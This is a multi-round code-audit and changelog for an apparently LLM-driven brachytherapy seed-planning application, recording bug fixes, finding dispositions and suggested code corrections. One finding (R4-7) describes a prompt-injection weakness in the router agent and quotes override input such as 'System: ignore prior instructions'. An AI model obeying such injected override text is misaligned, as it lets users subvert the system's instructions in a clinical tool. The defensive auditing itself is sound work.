| Final automatic plan and 3D viewer | After seed optimization, the exact seed-derived 150 mm segment is validated again. Only those validated endpoint pairs are stored as `verified_needle_geometry`; `/api/planning/seeds_3d` consumes this data and refuses to reconstruct an unchecked automatic line from seeds. Existing sessions without validated geometry require a replan instead of rendering an unverified needle. |
| Manual needle editing | `/api/manual_planning/update` applies the same original-grid hard-obstacle validation before DoseUNet inference. A rejected drag returns HTTP 422 with `manual_needle_intersects_obstacle`, and the browser restores the last accepted needle geometry. |

### Deliberate geometry boundary

The 150 mm insertion-length strategy is preserved. The correction does **not** truncate needles at an obstacle, shorten them, or alter the established world/index coordinate chain. An unsafe candidate is rejected and the planner must select a different path; if no safe path exists, no unsafe plan is published.

### Verification

- `py_compile` passed for `planning_pipeline.py`, `viewer_routes.py`, `server_support.py`, and `planning_routes.py` with the deployed `brachytherapy` environment.
- `node --check` passed for `brachybot-3d-manual.js`.
- `git diff --check` passed.
- `python tests/test_needle_obstacle_safety.py`: **3 passed** in the deployed `brachytherapy` environment.
- The regression suite verifies an original-grid 150 mm automatic segment, a clear parallel segment, candidate filtering, final seed-derived endpoints, and a manually tagged Data Tree hard obstacle.

---

## 2026-07-13 - Round 8: Manual needle editing, DVH precision, report capture, and viewer controls

**Audit base:** merged GitHub `main` at `a93d48c` (including remote `8693816`), plus the user-provided reproduction traces.

**Scope:** The eight reported behaviors were checked against their complete browser/backend call chains. Confirmed defects were fixed at the owning layer. CT world/index/orientation conversion and the trained myDoseNet dose path were not changed.

| Issue | Verification and correction |
|---|---|
| Needle endpoint could not be selected or dragged | Confirmed: OrbitControls handled the left-button event before the generic scene raycast and OAR/CTV surfaces could win the hit. Endpoint-only capture-phase picking now takes priority, handles are larger/on top, and release outside the canvas still commits the edit. `Replan Geometry` is exposed in the manual panel and `ui_controller`; it recomputes the edited geometry through myDoseNet. |
| DVH tooltip was offset from the cursor | Confirmed: the old tooltip displayed Plotly's nearest sampled `p.x`. It now maps the cursor to the actual x-axis plot rectangle and interpolates the displayed curve at that dose, so both dose and volume correspond to the cursor. |
| Figure 1 could be black | Confirmed: report capture could run while the renderer was hidden or before matrix/viewport state was committed. Captures are serialized, validate canvas dimensions and lit WebGL pixels, render after state synchronization, and retry once before accepting a figure. Mesh material visibility/opacity/depth state is restored completely. |
| Replanning could show an unchanged quality score | Confirmed in the score formula: the old advisory score used only V100. It now combines coverage, hotspot control (V150/V200), D90 homogeneity, and OAR peak-dose behavior, and stores a breakdown for auditability. It remains advisory and is not a clinical approval criterion. |
| OAR meshes disappeared after reconstruction/report capture | Confirmed as a race-prone lifecycle: aborted fetches did not cancel later mesh/report work. Refresh generations now invalidate stale render passes, report captures are serialized, and the existing mesh states are restored after temporary report views. |
| Manual colorbar controls were missing | Added a hidden `Dose Scale` entry with independent 2D-shared and 3D-surface range/palette controls. Defaults preserve the established 2D `0–1000 Gy / PET Rainbow` and 3D `0–200 Gy / Surface Rainbow`. Heatmaps, colorbars, report labels, and 3D vertex textures use the selected scope configuration; settings are persisted locally. |
| Multiple screenshots created separate galleries | Confirmed in `_interceptScreenshot`: every screenshot was passed directly to `addChat`. One assistant turn now shares a gallery panel with responsive thumbnails and click-to-enlarge modal viewing; local fallback captures use the same gallery. |
| Floating per-tool/reconstruction spinners duplicated the todo/trace | Confirmed: `showToolProgress`, mesh prewarm, and refresh code created extra fixed-position cards. These compatibility hooks now have no visual side effect; execution trace and todo list remain the single progress surface. |

### Additional compatibility correction

`AgenticSys._normalize_clinical_tool_calls` now treats the optional UI-state memory API as optional. This preserves explicit-message planning for lightweight memory adapters and test doubles without changing production UI-state behavior.

### Verification

- `node --check`: all seven modified browser scripts pass.
- `git diff --check`: pass.
- `pytest -q tests/test_review_round6_regressions.py`: **69 passed** (3 existing dependency warnings).
- Browser-level clinical rendering still requires a live server with CT/segmentation/dose data; the final smoke check must use a loaded case to validate WebGL picking and Figure 1 pixels.

### Deliberate boundaries

The manual replan action is explicitly the interactive myDoseNet recomputation for the current user-edited seed/needle geometry. It does not silently invoke the full automatic trajectory optimizer or alter the established coordinate chain. The quality score is an advisory visualization metric; clinical dose calculation and approval remain in the existing trained-model and clinician-review workflow.

---

## 2026-07-12 - Round 7: Planning re-run and viewer interaction correction

**Audit base:** `a62d837` plus the user-provided planning/replanning traces.

**Disposition:** All nine reported behaviors were reproduced or confirmed by
source-level call-chain inspection. The fixes below preserve the established
LPI coordinate chain and the trained dose-model planning path.

| Issue | Verification and correction |
|---|---|
| Final answer appeared before/after the checker | `brachybot-chat-todo.js` now buffers `text_chunk` events and renders only the canonical `response` event emitted after review. A missing canonical event never exposes the rejected draft. |
| Dark visual theme | `index.html` selects the existing dark design-token theme and bumps the CSS cache key. The 3D canvas remains black intentionally for clinical contrast. |
| Dose surface textured only CTV | Dose mode now loads label volumes explicitly and requests all available OAR meshes, not only the non-traversable planning subset. Existing mesh coordinate sampling is unchanged. |
| Unlisted red whole-body mask | The red area was the optional HU threshold display filter, not a clinical mask. Its default is now empty; it is cleared on CT load/reset and can still be enabled explicitly by the user. |
| Planning parent did not control descendants | Planning and Trajectories now have visibility/opacity controls, context menus, seed/needle handle synchronization, dose-overlay synchronization, and individual trajectory descendant propagation. |
| Reference-direction replan was misunderstood/blocked | Replan intent recognizes Chinese/English mixed commands, reuses completed CTV/OAR products, reverses the current UI/config direction, and bypasses the previous-plan hard block only for an explicit replan. |
| Manual UI direction was not reaching chat | `collectUIState()` now sends the numeric `reference_direc` vector. The backend stores it with the request-scoped UI state and uses it for the replan override. |
| DVH tooltip dose did not match cursor | Tooltip dose is now calculated from the actual CSS plot rectangle and linear axis range instead of Plotly's private pixel conversion helper. |
| Normal/Dose surface switching after reconstruction | Replaced meshes invalidate stale material snapshots and are remapped asynchronously while dose mode is active; newly added skin is hidden consistently in dose mode. |

### Verification

- `py_compile`: modified Python routes/runtime pass.
- `node --check`: all modified browser scripts pass.
- `pytest`: `tests/test_review_round6_regressions.py` and
  `tests/test_round7_regressions.py` pass.
- Browser smoke check on `http://127.0.0.1:8765`: after reload,
  `data-theme="dark"`, threshold input is empty with `HU` placeholder, and
  no console warnings/errors were observed.

### Deliberate boundaries

The dose-surface enhancement only changes which already-available segmented
meshes are sampled. It does not alter CT orientation, world/index conversion,
dose calibration, or the trained planning dose engine. The threshold field is
still available as an explicit visualization tool; it is not promoted to the
data tree because it is a transient image filter rather than a segmentation
product.

---

## 2026-07-12 - Round 6: Production hardening and independent re-verification

**Audit base:** `6a15470`

**Published stage checkpoint:** `ec630cb`

**Method:** source-level call-chain review, report-to-code verification, targeted
regressions, full unit tests, static analysis, and desktop/mobile browser checks.

This pass did not accept the previous report at face value. Each of its 95
findings was compared with the current implementation. Confirmed defects were
fixed at their shared ownership point; false positives, compatibility contracts,
and low-value structural churn are explicitly recorded below. No confirmed
Critical or High runtime defect from the 95-item review remains open.

### Disposition of all 95 reported findings

#### Critical (C1-C18)

| ID | Disposition | Current evidence |
|---|---|---|
| C1 | Fixed | `AgentMemory` is imported in both LLM execution paths. |
| C2 | Fixed | The web facade imports the canonical dose scale. |
| C3 | Fixed | Streaming forced-search finalization runs after both success and failure. |
| C4 | Fixed | Planning image/label paths use the centralized read allowlist. |
| C5 | Fixed | Rate-limit cleanup and mutation are lock protected. |
| C6 | Not a defect | `str.format()` does not recursively interpret braces inside argument values; a regression covers literal braces. |
| C7 | Fixed | Direct, streaming, non-streaming, and workflow-enforcer tool calls use `_execute_tool_with_memory` exactly once. |
| C8 | Fixed | Auto-planning output can no longer replace an unrelated answer; planning enforcement is intent gated. |
| C9 | Fixed | Optional enhanced-memory clear methods are invoked only when callable. |
| C10 | Fixed | The invalid duplicate report-generator registration was removed. |
| C11 | Fixed | `loadDefaultParams` uses one hoisted setter and has no TDZ redeclaration. |
| C12 | Fixed | `{current_date}` is replaced in streaming and non-streaming prompts. |
| C13 | Fixed | Full-plan completion recognizes pipeline, seed, dose, and evaluation tools with explicit grouping. |
| C14 | Fixed | Advice detection is scoped and no longer converts general knowledge questions into planning runs. |
| C15 | Fixed | STL export writes real ASCII STL geometry. |
| C16 | Fixed | Step number styling exists in the split CSS bundle. |
| C17 | Fixed | The orphan CSS declaration was removed during stylesheet modularization. |
| C18 | Fixed | Warning cards retain their amber border. |

#### High (H1-H22)

| ID | Disposition | Current evidence |
|---|---|---|
| H1 | Fixed | Experience recording uses safe optional-component access. |
| H2 | Fixed | Invalid font-family quoting was corrected. |
| H3 | Fixed | Cancellation is checked between streaming LLM rounds and by generation token. |
| H4 | Fixed by contract | Both paths use the same CT-loaded predicate while trusted-local developer tools remain available without CT. |
| H5 | Fixed | Runtime exception handling no longer catches process-control exceptions with bare `except`. |
| H6 | Fixed | Viewer image reads use `_validate_path`, including configured modality roots. |
| H7 | Fixed | Oversized requests and unhandled exceptions return JSON; 500s are logged. |
| H8 | Fixed | Dose calibration is centralized in `plans.dose_pre.model_loader`. |
| H9 | Fixed | The configured Anthropic provider dependency is declared. |
| H10 | Operational, not source defect | External stale worktrees are deliberately not deleted or overwritten by product code. |
| H11 | Fixed | Python-style tool payloads use `ast.literal_eval`; JSON remains the primary protocol. |
| H12 | Fixed | Response cleaning was consolidated and unreachable/redundant branches removed. |
| H13 | Intentional alias | DICOM export route names share one implementation for backward compatibility. |
| H14 | Fixed | CT transfer clips before signed 16-bit conversion. |
| H15 | Fixed | Mesh-cache order uses `deque.popleft()`. |
| H16 | Fixed | Repeated imports were moved out of the OAR-label loop. |
| H17 | Fixed | One dose-overlay renderer is authoritative; compatibility callers delegate to it. |
| H18 | Fixed | Contour labels require a finite level before formatting. |
| H19 | Fixed | Dynamic UI language reads the single `_i18nLang` state. |
| H20 | Fixed | Mesh-cache keys contain a BLAKE2 mask-content digest. |
| H21 | Fixed | The 500 handler logs the originating exception. |
| H22 | Fixed | Required API-key mode fails during startup when the key is absent. |

#### Important (I1-I25)

| ID | Disposition | Current evidence |
|---|---|---|
| I1 | Fixed | Status reads the canonical `ct_image` state. |
| I2 | Fixed | The dead route `session_context` argument was removed. |
| I3 | Fixed | First-party `brachybot-*.js` files contain no production `console.log`. |
| I4 | Fixed | Conversation `data_available` is populated from canonical case memory. |
| I5 | Fixed | `dose_engine` is canonical and legacy names are explicit aliases only. |
| I6 | Fixed | Production diagnostics use logging rather than ad-hoc prints. |
| I7 | Fixed | Completion detection covers every supported planning completion path. |
| I8 | Fixed | OAR counts resolve by label/name metadata instead of mismatched keys. |
| I9 | Fixed | Browser chat history is bounded. |
| I10 | Fixed | Planning data-tree arrays are null guarded. |
| I11 | Verified | Script order and global UI API contract are documented and checked by browser load tests. |
| I12 | Fixed | Tool execution/storage/recovery is centralized; only orchestration-specific control flow remains. |
| I13 | Intentional structure | Generator and return-value loops remain separate, but share prompt, parsing, execution, review, and cancellation helpers. |
| I14 | Fixed | The dead Anthropic conversion helper was removed. |
| I15 | Fixed | Routes resolve a request-scoped agent through `get_agent`; no patient-global agent is used. |
| I16 | Fixed | The `builtins` operation-tracker monkey patch was removed. |
| I17 | Fixed | Upload paths use the canonical `UPLOAD_DIR`. |
| I18 | Fixed | Screenshot capture is awaited. |
| I19 | Fixed | Screenshot requests are correlated by request id instead of a timer race. |
| I20 | Fixed | 3D reconstruction uses server-provided label IDs. |
| I21 | Fixed | Dose texture sampling prefetches unique slices in a batch. |
| I22 | Fixed | Agent memory owns one real lock; no orphan fallback lock protects nothing. |
| I23 | Fixed | Overlay thresholding and display use the same intensity frame. |
| I24 | Fixed | Regression suites now cover runtime, routes, security, planning, coordinates, reports, and UI contracts. |
| I25 | Duplicate | Same finding as C12; covered by the current-date regressions. |

#### Minor (M1-M30)

| ID | Disposition | Current evidence |
|---|---|---|
| M1 | Fixed | Ruff removed all unused imports from `agent_runtime`. |
| M2 | Accepted style debt | Remaining eager logger formatting is not a correctness defect; array-heavy hot paths were reviewed separately. |
| M3 | Intentional ownership | `seeds_3d` is a viewer representation endpoint even though its data originates in planning. |
| M4 | Intentional compatibility | Remaining inline styles define report/form geometry and PDF pagination; the rationale is documented in `index.html`. |
| M5 | Accepted organization debt | Moving data-tree CSS alone has no product benefit and risks cascade changes; ownership is documented. |
| M6 | Fixed | All CT/MR/US/data/output/filesystem root variables are documented in README. |
| M7 | Fixed | Agents are request/session scoped and guarded by the session lock. |
| M8 | Intentional protocol handling | Cleaning patterns represent different provider protocols; shared normalization is centralized where semantics match. |
| M9 | Fixed | No unused random API key is generated; loopback/no-key and remote/key behavior is explicit. |
| M10 | Fixed | Same parser correction as H11. |
| M11 | Fixed | Provider calls use bounded retry behavior without replaying completed tool side effects. |
| M12 | Fixed | Conversation clearing no longer references an unrelated experience-memory attribute. |
| M13 | Fixed | Runtime mixins are exported and BrachyAgent validates their composition at startup. |
| M14 | Fixed | Cross-file i18n startup uses a bounded compatibility retry. |
| M15 | Fixed | Dead todo template constants were removed. |
| M16 | Intentional compatibility | Classic scripts expose the window-level UI control contract; an all-at-once ES-module migration is required before strict mode. |
| M17 | Fixed | 3D rendering is event driven and pauses when the document is hidden. |
| M18 | Fixed | The welcome message participates in the UI language system. |
| M19 | Fixed | Parallel language state was consolidated. |
| M20 | Fixed | Pytest configuration and async support are declared. |
| M21 | Fixed | The unused websocket client collection was removed. |
| M22 | Fixed | The dead `first_url` variable was removed. |
| M23 | Intentional model contract | `normalize_dose_image` creates myDoseNet conditioning input, not a physical dose estimate; an English comment prevents misuse. |
| M24 | Operational, not source defect | External test worktrees are outside this tracked product tree and are not silently modified. |
| M25 | Fixed | API keys and screenshot signatures use constant-time HMAC comparison. |
| M26 | Fixed | Upload sanitization helpers are module scoped. |
| M27 | Fixed | Duplicate tooltip keys were removed. |
| M28 | Fixed | Display/volume conversion guards zero resample ratios. |
| M29 | Fixed | Report source/reset arguments use JSON serialization plus HTML-attribute escaping in both renderers. |
| M30 | Fixed | Duplicate object-literal keys were removed. |

### Additional confirmed defects fixed in Round 6

| Area | Verified problem | Resolution |
|---|---|---|
| Planning core | Standalone seed planners unpacked a variable-length plan as a 2-tuple; auto direction, Dxcc spacing, NumPy truth checks, metadata `None`, RL dispatch, and OAR provenance also had real edge failures. | Corrected at the shared planning/model boundary with regressions. |
| Dose model | Manual preview and legacy utilities could imply analytical/Gaussian dose; checkpoint loading and scale interpretation were duplicated. | Active dose is myDoseNet-only and fails closed without a checkpoint. Legacy analytical entry points fail explicitly. |
| Intra-operative replanning | Unverified coordinate frames and independent replacement-dose planning could report false success. | Physical-frame verification, assignment-based seed matching, residual myDoseNet planning, and cumulative dose evaluation were added. |
| Session and cancellation | UI state, screenshots, history restoration, and cancellation could cross or outlive turns. | State is session scoped; cancellation uses per-turn generation tokens and stale callbacks cannot finish a newer turn. |
| Web security | `web_fetch` allowed unsafe destinations, document reads had broad path/size boundaries, and signed image handling was inconsistent. | Added redirect-aware SSRF checks, root/size enforcement, and short-lived signed image URLs. |
| Coordinates and geometry | Seed segmentation exposed array-order coordinates as physical XYZ and surface extraction treated full volumes as boundary shells. | Added explicit ZYX-to-index-to-physical conversion and true boundary extraction without changing the established viewer coordinate contract. |
| Frontend/reporting | DVH had duplicate/unreachable interpolation code and a 30-curve cap; opacity zero could fall back to a nonzero default; report layout/reset fields had responsive and escaping defects. | All available DVH curves render with bounded monotone interpolation/tooltips, zero opacity hides cleanly, and report/editor/viewer layouts are responsive and escaped. |
| CTV model routing | Non-target/MRI research models were exposed as automatic CT CTV choices; direct calls bypassed canonical memory processing; prompts/tool catalogs disagreed. | Automatic registry now contains only supported CT target routes, direct execution is canonical, and ambiguous sites trigger clarification. |
| CTV provenance routing | A prior manual/imported CTV could leave `manual_label` in case memory, and direct segmentation treated that provenance marker as a model name. | Direct routing now admits only the explicit automatic CTV model allowlist; source markers and unsupported sites return to clarification instead of invoking a model. |
| PANORAMA labels | Vein/artery and duct names were incomplete or reversed in the optional VoCo path. | Mapping now follows the official PANORAMA legend: PDAC=1, veins=2, arteries=3, pancreas=4, pancreatic duct=5, common bile duct=6. |
| Python/CLI planning API | `ctv_path` was optional but there was no way to provide a tumor model, so automatic CTV planning failed by construction. | Added backward-compatible `tumor_type`, CLI `--tumor-type`, `--host`, environment-backed port/host, and clear preflight failure for ambiguity. |

### Deliberate product and clinical boundaries

- The established SimpleITK physical-coordinate chain and current LPS-oriented
  planning contract were preserved. No speculative flip or axis rewrite was made.
- `dose_distribution_gy` remains a legacy compatibility key in a few responses;
  payloads also state `dose_units=normalized_model_output` and
  `dose_scale_gy`, so callers can interpret the calibrated myDoseNet output.
- Unknown tumor sites never inherit another site's prescription or OAR limit.
  Clinical pass/fail language requires explicit `plan_config` or source-backed
  `clinical_kb` evidence.
- All DVH structures are retained. Rendering is not silently truncated; dense
  legends may scroll or collapse visually without deleting clinical curves.
- Code execution, shell execution, environment management, and LLM-authored
  tool creation remain available only through explicit trusted-local toggles.
  They are developer capabilities, not operating-system sandboxes.

### Final verification evidence

- `pytest -q`: **99 passed** (13 third-party deprecation warnings).
- Ruff: F821/F822/F823/E9 passed repository-wide; F401 passed for
  `agent_runtime` after import cleanup.
- `compileall`: passed for production packages, CLI, and tests.
- `node --check`: passed for all 11 `brachybot-*.js` application scripts and
  the bundled `OrbitControls.js` support script.
- Browser desktop (`1280x720`): no horizontal overflow and no console warnings/errors.
- Browser mobile (`390x844`): no horizontal overflow, no off-viewport elements,
  and no console warnings/errors.
- `brain/core/toolset.json` parses and every CTV catalog source is an HTTP(S) link.

### Residual validation boundary

This repository pass does not replace site validation. The optional CTV
checkpoints, myDoseNet checkpoint, TotalSegmentator runtime, GPU execution, and
complete planning on representative clinical CT series were not available for a
fresh local end-to-end clinical run. Those components therefore remain research
software requiring independent dosimetric, geometric, and clinical validation
before patient use. This is an evidence boundary, not an unimplemented code
fallback.

---

## 2026-07-10 — Round 5: Final sweep pass (no code changes)

This round re-verified all CRITICAL/HIGH findings from Rounds 1–4 and confirmed they remain open. No code was modified — this is a purely documentary update. Total findings across all rounds: **18 CRITICAL, 32 HIGH, 44 MEDIUM, 51 LOW** (~145 issues).

The four most clinically impactful unremediated findings are:

| Round | ID | Severity | Summary |
|-------|----|----------|---------|
| R4-1 | seed_planning.py + seed_planning_rule_based.py | CRITICAL | `core.optimal_plan` return-value unpacking crashes on >2 trajectories — both standalone seed-planning tools are non-functional for all realistic cases |
| R4-2 | planning_pipeline.py:949 | CRITICAL | Literal `"auto"` string passed as `ref_direc` — falls back to `[0,0,1]` needle direction instead of organ-aware default |
| R4-3 | planning_pipeline.py:1435 | CRITICAL | OAR Dxcc metrics use original CT voxel volume (~2.3 mm³) instead of resampled-grid volume (~28 mm³) — metrics off by ~12× |
| R4-4 | AgenticSys.py:1101 | CRITICAL | `result.metadata is None` crash on tools returning success with no metadata |

No new issues were identified in this pass beyond what Rounds 1–4 already document.

---



This round scanned all code that was missed by previous rounds (Round 1–3 focused on `plans/`, `brain/`, `agent_runtime/`, `web/`, `memory/`, `skills/`, `quality/`, `communication/`, `utils/`). Still-unreviewed modules were dispatched to 4 parallel review agents. Every finding below was confirmed by tracing at least one level into the call chain.

**Newly reviewed (unreviewed in previous rounds):**
| Module | LOC | Agent coverage |
|--------|-----|----------------|
| `AgenticSys.py` | 1829 | Top-level orchestration: tool execution, memory wiring, auto-planning trigger |
| `agents/` | 2715 | Multi-agent orchestration: `orchestrator`, `plan_reviewer`, `safety_guardian`, `router_agent`, `fact_checker`, `completeness_checker`, `brachy_agent_wrapper`, `base_agent` |
| `tool_factory/seed_plan/planning_pipeline.py` | 1726 | Clinical planning pipeline: trajectory init/refine, seed planning orchestration, dose computation, OAR metrics |
| `tool_factory/seed_plan/seed_planning.py`, `seed_planning_rule_based.py`, `seed_planning_rl.py` | ~600 | Standalone seed-planning tool wrappers |
| `tool_factory/clinical_kb/__init__.py` | 651 | Clinical knowledge base loading and constraint retrieval |
| `tool_factory/safety_validator/__init__.py` | 540 | Safety validation rules, OAR constraint checking |
| `config/prompts/` + `config/prompts/multi_agent/` | 218 | LLM system prompts (markdown files + __init__) |
| `brain/knowledge/rag.py` + `knowledge_base.json` | 130+81 | Knowledge retrieval (RAG) + indexed knowledge chunks |
| `brain/knowledge/ui_knowledge.json` | 358 | UI knowledge for LLM reference |
| `brain/prompts/` | 10 | Empty (placeholder) |
| `dose_pre/` (root) | 513 | Dose prediction model (duplicate of `plans/dose_pre/`) |
| `brachybot.py` | 124 | CLI entry point |
| `brain/demos/demo.py` | 316 | Integration demo script |
| `tests/` | 1327 | Test suite (basic + multi-agent phase 2/3) |

**NOT reviewed in this pass (already covered in Rounds 1–3 or non-code):**
- `plans/`, `brain/` (core), `agent_runtime/`, `web/`, `memory/`, `skills/`, `quality/`, `communication/`, `utils/` (Round 3)
- `benchmarks/` (20K LOC but mostly JSON test vectors; `aligned_benchmark.py` is test-runner code — low priority for algorithmic review)
- `docs/ref.py` (7.5K LOC reference file — helper functions only, not production)
- `tool_factory/env_manager/envs/` (vendored venvs — not project code)
- `tool_factory/auto_generated/` (auto-generated tool stubs)

---

### Round 4: CRITICAL findings (production-triggered crashes or wrong clinical output)

---

**R4-1. `core.optimal_plan` return-value unpacking crash in `seed_planning.py` and `seed_planning_rule_based.py`**

**Files:**
- `tool_factory/seed_plan/seed_planning.py:189`
- `tool_factory/seed_plan/seed_planning_rule_based.py:174`

**Code:**
```python
optimal_plan, _ = core.optimal_plan(
    init_trajectories=trajectories, ...
)
```

`core.optimal_plan` (defined in `plans/core.py:117`, return at line 320) returns a list of N trajectory-result lists: `[ [traj_info, seeds, doses], ... ]`. It does NOT return a 2-tuple. The unpacking `optimal_plan, _ = ...` crashes with `ValueError: too many values to unpack` for any clinical case that produces more or fewer than 2 trajectories.
- Typical clinical cases: 5–50 trajectories.
- SeedPlanningTool and RuleBasedSeedPlanningTool are **non-functional for all realistic clinical cases** — any user calling these explicit tool endpoints gets an immediate crash.
- The RL-based tool (`seed_planning_rl.py:152`) correctly calls `optimal_plan = core.optimal_plan_rf(...)` with single-assignment, confirming the other two paths were copy-paste errors.
- The `planning_pipeline.py:1117` path calls the same `core.optimal_plan` and correctly assigns the whole list to `plan_res` without unpacking — so the pipeline path works but the standalone tools are broken.

**Suggested fix:** Change both sites to `optimal_plan = core.optimal_plan(...)` (single assignment).

---

**R4-2. Literal string `"auto"` passed as `ref_direc` to `_step_trajectory_init` (trajectory refine path)**

**File:** `tool_factory/seed_plan/planning_pipeline.py:949`

**Code:**
```python
# Pass sentinel "auto" so the init step picks an organ-aware default
init_result = self._step_trajectory_init(ct_image, ctv_mask, oar_mask, "auto", {}, agent)
```

The literal string `"auto"` is passed where `_step_trajectory_init` expects a direction vector. Inside `_step_trajectory_init` (line 867):
```python
ras_direc = np.array(ref_direc).reshape(-1)      # array(['auto']) dtype='<U4'
voxel_direc = _convert_ref_direc_to_voxel(ras_direc, resampled_ct)  # string × float → exception
```
`np.array("auto").reshape(-1)` → `array(['auto'])` (shape `(1,)`, dtype string). Then `ras_direction_to_voxel` does `ras_direc @ direction` which is string × float → fails at NumPy level. Exception caught at line 870 → falls back to `voxel_direc = np.array([0, 0, 1])`.

A `_resolve_ref_direc` function exists (line 353) that correctly handles `"auto"` by resolving to organ-specific defaults, geometric detection, or a global default. The main path (line 656) uses it — the refine path at line 949 does not.

**Impact:** When `_step_trajectory_refine` auto-recovery triggers (trajectories missing from memory), the fallback direction `[0, 0, 1]` (= "inferior" in LPS, needle from feet up) is used instead of the correct organ-aware approach direction (e.g., posterior for pancreas). Resulting trajectories may miss the CTV entirely.

**Suggested fix:** Resolve through `_resolve_ref_direc` before passing:
```python
resolved_ref_direc = _resolve_ref_direc("auto", ct_image, ctv_mask, agent)
init_result = self._step_trajectory_init(ct_image, ctv_mask, oar_mask, resolved_ref_direc, {}, agent)
```

---

**R4-3. OAR Dxcc metrics computed with wrong voxel volume (wrong spacing used)**

**File:** `tool_factory/seed_plan/planning_pipeline.py:1435`

**Code:**
```python
spacing = agent.memory.retrieve("ct_spacing") or (0.68, 0.68, 5.0)
voxel_vol_cm3 = float(spacing[0] * spacing[1] * spacing[2]) / 1000.0
```

`"ct_spacing"` is stored as the **original CT spacing** (e.g., 0.68×0.68×5.0 mm from a 512×512×48 CT). But the dose distribution and OAR masks are on a **resampled planning grid** (128×128×64 with spacing ~2.7×2.7×~3.8 mm). The resampled CT with its correct spacing is stored in `agent.memory.retrieve("resampled_ct")` but never used here.

Voxel volume comparison:
- Original CT: 0.68 × 0.68 × 5.0 = 2.31 mm³
- Resampled grid: ~2.72 × 2.72 × ~3.75 = ~27.7 mm³
- Error factor: **~12×**

Because the Dxcc formula sorts doses descending and picks the top N voxels corresponding to x cm³, using a 12× smaller voxel volume means D2cc selects only 1/12 of the actual hottest voxels, overestimating the dose. All OAR metrics (D2cc, D1cc, D0.1cc, D50, etc.) are systematically wrong. A physician reviewing D2cc constraints would see misleading values — possibly causing false clearance of dangerous plans or false rejection of safe plans.

**Suggested fix:**
```python
resampled_ct = agent.memory.retrieve("resampled_ct") if agent else None
if resampled_ct is not None:
    spacing = resampled_ct.GetSpacing()
else:
    spacing = (0.68, 0.68, 5.0)  # fallback
voxel_vol_cm3 = float(spacing[0] * spacing[1] * spacing[2]) / 1000.0
```

---

**R4-4. `AgenticSys.py:_execute_tool_with_memory` — `result.metadata` is `None` crash**

**File:** `AgenticSys.py:1101, 1158-1159`

**Code (line 1101):**
```python
if tool_name == "ctv_segmentation" and "ctv_array" in result.metadata:
```
And (line 1159):
```python
logger.info(f"OAR segmentation result: oar_array={'oar_array' in result.metadata}, ...")
```

If any tool returns `ToolResult(success=True, metadata=None)`, both `in` operations crash with `TypeError: argument of type 'NoneType' is not iterable`. The connected path at lines 1274+ already uses the safe pattern `(oar_result.metadata or {})` but these two sites were not updated.

**Impact:** A tool that returns metadata=None (e.g., a buggy version of segmentation, or a newly registered third-party tool) crashes the entire `_execute_tool_with_memory` flow, aborting post-execution processing (memory stores, label merging, auto-planning trigger). The user sees a 500 error with no recovery.

**Suggested fix:**
```python
meta = result.metadata or {}
if tool_name == "ctv_segmentation" and meta and "ctv_array" in meta:
```

---

### Round 4: HIGH findings (production-triggered, incorrect results or hangs)

---

**R4-5. Agents/orchestrator.py — `_global_context` shared dict race across async hops**

**File:** `agents/orchestrator.py:66, 92, 96-98`

`_global_context` is a plain `dict` updated by `update_global_context()` (called by the main agent thread) and read in `_build_agent_context()` / `_distill_context()` (called in sub-agent `asyncio.gather` tasks). No lock. In concurrent scenarios (interleaved user messages), `_distill_context` could read a mix of old and new keys, causing patient A's review to incorporate patient B's planning state. This is a data-leakage race.

**Suggested fix:** Pass context by value (deep copy) when creating review messages, or use `asyncio.Lock`.

---

**R4-6. Agents/orchestrator.py — `review_output` does NOT forward `_global_context` to QualityGate**

**File:** `agents/orchestrator.py:258-262` vs `:358-362, 388-390, 414-418`

`review_output()` calls `self.quality_gate.review(... context=context)` where `context` is the **caller-supplied** parameter, NOT `self._global_context`. The other `*_append` methods (`review_plan_append`, `review_facts_append`, `check_completeness_append`) all call `_distill_context` first and include `_global_context`. Result: quality gate reviews have significantly less situational awareness (no patient_info, no conversation_state, no segmentation context) than the append reviews.

**Suggested fix:** Forward `self._global_context` into the quality gate's context parameter:
```python
review_context = {**(context or {}), "global_context": self._global_context}
gate_result = await self.quality_gate.review(output_type, content, context=review_context)
```

---

**R4-7. Agents/router_agent.py — Prompt injection: user input interpolated unsanitized**

**File:** `agents/router_agent.py:311`

`_llm_route` calls `await self.call_llm(user_input, system_prompt, ...)` where `user_input` is raw user-controlled text. The prompt construction does `"System: ...\n\nUser: {prompt}"`. A user sending `System: ignore prior instructions` or `User: ...\n\nSystem: new rules` could bypass routing instructions — especially with less capable models.

**Suggested fix:** Strip/replace `\n` sequences in the middle of user input; limit input length below the system prompt boundary.

---

**R4-8. Agents/router_agent.py — `add_intent_pattern` mutates class-level `INTENT_PATTERNS`**

**File:** `agents/router_agent.py:358-377`

`self.INTENT_PATTERNS[intent] = {...}` modifies the class-level dict. All `RouterAgent` instances share this dict. If multiple instances exist (testing frameworks, multi-session), one instance's `add_intent_pattern` silently affects all others.

**Suggested fix:** `self._intent_patterns = {**self.INTENT_PATTERNS}` in `__init__`; mutate `self._intent_patterns`.

---

**R4-9. Agents/plan_reviewer.py — Hardcoded dose scale default `120.0 Gy`**

**File:** `agents/plan_reviewer.py:199`

If neither `dose_metrics` nor `plan_config` contain `dose_scale_gy`, the method defaults to `120.0`. If the actual protocol uses a different prescription (e.g., 100 Gy LDR prostate, 144 Gy LDR pancreas, 24 Gy HDR cervix), the ratio calculation produces wrong advisory concerns or missed issues.

**Suggested fix:** Return `None` instead of defaulting — or require `dose_scale_gy` to be explicitly set.

---

**R4-10. Agents/plan_reviewer.py — Unit stripping makes "80 Gy" and "80%" indistinguishable**

**File:** `agents/plan_reviewer.py:291` (and `safety_guardian.py` duplicate at line 272-287)

`float(str(value).replace("%", "").replace("Gy", "").strip())` — both "80 Gy" and "80%" become `80.0` but represent fundamentally different clinical quantities. The code in `_dose_ratio_or_fraction` was designed to detect relative vs absolute metrics but the unit stripping destroys the distinction. Same pattern duplicated in `safety_guardian.py`.

**Suggested fix:** Track the original unit alongside the numeric value; require a unit field in `plan_config`.

---

**R4-11. Agents/fact_checker.py:239 + completeness_checker.py:229 — `str.format()` crash on `{` in user/claim text**

**Files:**
- `agents/fact_checker.py:239`: `_CLAIM_PROMPT.format(claims=..., sources=...)`
- `agents/completeness_checker.py:229`: `_COMPLETENESS_PROMPT.format(user_message=..., ...)`

If any claim, source, user_message, or tool_step text contains literal `{` or `}` characters (e.g., "dose value {80 Gy}" in a claim, or API error messages), Python's `str.format()` raises `KeyError`/`IndexError`. The entire fact-check or completeness check fails and silently falls back to deterministic-only results.

